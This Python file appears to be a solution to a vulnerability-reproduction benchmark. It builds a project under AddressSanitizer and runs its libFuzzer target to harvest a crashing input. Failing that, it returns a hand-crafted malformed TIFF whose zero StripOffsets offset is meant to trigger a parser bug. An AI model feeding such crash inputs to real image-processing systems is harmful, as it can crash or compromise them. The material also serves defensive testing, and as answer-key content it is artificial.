import os
import tarfile
import tempfile
import subprocess
import shutil
import glob
import zipfile
import stat
from typing import Optional, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc: Optional[bytes] = None
        try:
            poc = self._generate_poc_dynamic(src_path)
        except Exception:
            poc = None
        if poc:
            return poc
        return self._fallback_poc()

    def _generate_poc_dynamic(self, src_path: str) -> Optional[bytes]:
        work_dir = tempfile.mkdtemp(prefix="poc_gen_")
        # Extract tarball
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(work_dir)
        except Exception:
            return None

        # Locate build.sh
        build_sh = self._find_file(work_dir, "build.sh")
        if not build_sh:
            return None
        build_dir = os.path.dirname(build_sh)

        # Prepare environment
        out_dir = os.path.join(build_dir, "out")
        env = os.environ.copy()
        env.setdefault("OUT", out_dir)

        # Choose compiler
        if "CC" not in env:
            if shutil.which("clang"):
                env["CC"] = "clang"
            elif shutil.which("gcc"):
                env["CC"] = "gcc"
        if "CXX" not in env:
            if shutil.which("clang++"):
                env["CXX"] = "clang++"
            elif shutil.which("g++"):
                env["CXX"] = "g++"

        # Add sanitizer flags if not present
        san_flags = "-g -O1 -fno-omit-frame-pointer -fsanitize=address,undefined"
        if "-fsanitize=" not in env.get("CFLAGS", ""):
            env["CFLAGS"] = (env.get("CFLAGS", "") + " " + san_flags).strip()
        if "-fsanitize=" not in env.get("CXXFLAGS", ""):
            env["CXXFLAGS"] = (env.get("CXXFLAGS", "") + " " + san_flags).strip()

        env.setdefault("FUZZING_ENGINE", "libfuzzer")
        env.setdefault("SANITIZER", "address")
        env.setdefault("ARCHITECTURE", "x86_64")

        os.makedirs(env["OUT"], exist_ok=True)

        # Build project
        try:
            subprocess.run(
                ["bash", os.path.basename(build_sh)],
                cwd=build_dir,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
                timeout=600,
            )
        except Exception:
            return None

        # Candidate output directories
        candidate_out_dirs: List[str] = []
        if os.path.isdir(env["OUT"]):
            candidate_out_dirs.append(env["OUT"])
        bd_out = os.path.join(build_dir, "out")
        if os.path.isdir(bd_out) and bd_out not in candidate_out_dirs:
            candidate_out_dirs.append(bd_out)
        root_out = os.path.join(work_dir, "out")
        if os.path.isdir(root_out) and root_out not in candidate_out_dirs:
            candidate_out_dirs.append(root_out)
        if not candidate_out_dirs:
            candidate_out_dirs.append(build_dir)

        # Find fuzzer executable
        fuzzer_path = self._find_fuzzer_executable(candidate_out_dirs)
        if not fuzzer_path:
            return None

        fuzzer_dir = os.path.dirname(fuzzer_path)

        # Find and unpack seed corpora
        zip_paths = set()
        for od in candidate_out_dirs:
            for path in glob.glob(os.path.join(od, "*_seed_corpus.zip")):
                zip_paths.add(path)
        for path in glob.glob(os.path.join(fuzzer_dir, "*_seed_corpus.zip")):
            zip_paths.add(path)

        corpus_dirs: List[str] = []
        for z in zip_paths:
            if zipfile.is_zipfile(z):
                cdir = tempfile.mkdtemp(prefix="corpus_")
                try:
                    with zipfile.ZipFile(z, "r") as zf:
                        zf.extractall(cdir)
                    corpus_dirs.append(cdir)
                except Exception:
                    pass

        artifact_dir = os.path.join(work_dir, "artifacts")
        os.makedirs(artifact_dir, exist_ok=True)

        # Run fuzzer to auto-generate crash
        cmd = [
            fuzzer_path,
            "-max_total_time=30",
            "-timeout=10",
            "-rss_limit_mb=2048",
            f"-artifact_prefix={artifact_dir}{os.sep}",
        ]
        for cdir in corpus_dirs:
            if os.path.isdir(cdir):
                cmd.append(cdir)

        try:
            subprocess.run(
                cmd,
                cwd=fuzzer_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=60,
            )
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            return None

        crash_files = sorted(glob.glob(os.path.join(artifact_dir, "crash-*")))
        if not crash_files:
            return None

        crash_files.sort(key=lambda p: os.path.getsize(p))
        try:
            with open(crash_files[0], "rb") as f:
                return f.read()
        except Exception:
            return None

    def _find_file(self, root: str, filename: str) -> Optional[str]:
        for dirpath, _, filenames in os.walk(root):
            if filename in filenames:
                return os.path.join(dirpath, filename)
        return None

    def _find_fuzzer_executable(self, dirs: List[str]) -> Optional[str]:
        exe_candidates: List[str] = []
        for base in dirs:
            if not os.path.isdir(base):
                continue
            for dirpath, _, filenames in os.walk(base):
                for fname in filenames:
                    full = os.path.join(dirpath, fname)
                    try:
                        st = os.stat(full)
                    except OSError:
                        continue
                    if not stat.S_ISREG(st.st_mode):
                        continue
                    if not os.access(full, os.X_OK):
                        continue
                    if fname.endswith((".a", ".o", ".so", ".dylib", ".dll", ".exe")):
                        continue
                    if st.st_size < 1024:
                        continue
                    try:
                        with open(full, "rb") as f:
                            magic = f.read(4)
                        if magic != b"\x7fELF":
                            continue
                    except Exception:
                        continue
                    exe_candidates.append(full)
        if not exe_candidates:
            return None

        def score(path: str):
            name = os.path.basename(path).lower()
            s = 0
            if "fuzz" in name:
                s -= 10
            if "tiff" in name or "tif" in name:
                s -= 5
            return s, len(name)

        exe_candidates.sort(key=score)
        return exe_candidates[0]

    def _fallback_poc(self) -> bytes:
        import struct

        # Minimal TIFF with an offline tag (StripOffsets) whose value offset is zero.
        # Header: 'II' (little-endian), magic 42, first IFD at offset 8.
        header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)

        # IFD with 1 entry
        num_entries = struct.pack("<H", 1)

        # Tag 273 (StripOffsets), type 4 (LONG), count 8 (size 32 > 4, so stored out-of-line),
        # value_offset set to 0 to trigger the bug.
        tag = 273  # 0x0111
        type_long = 4
        count = 8
        value_offset = 0
        entry = struct.pack("<HHII", tag, type_long, count, value_offset)

        # Next IFD offset = 0 (no more IFDs)
        next_ifd = struct.pack("<I", 0)

        # Dummy data region
        data_region = b"\x00" * 32

        tiff = header + num_entries + entry + next_ifd + data_region

        if len(tiff) < 64:
            tiff += b"\x00" * (64 - len(tiff))

        return tiff
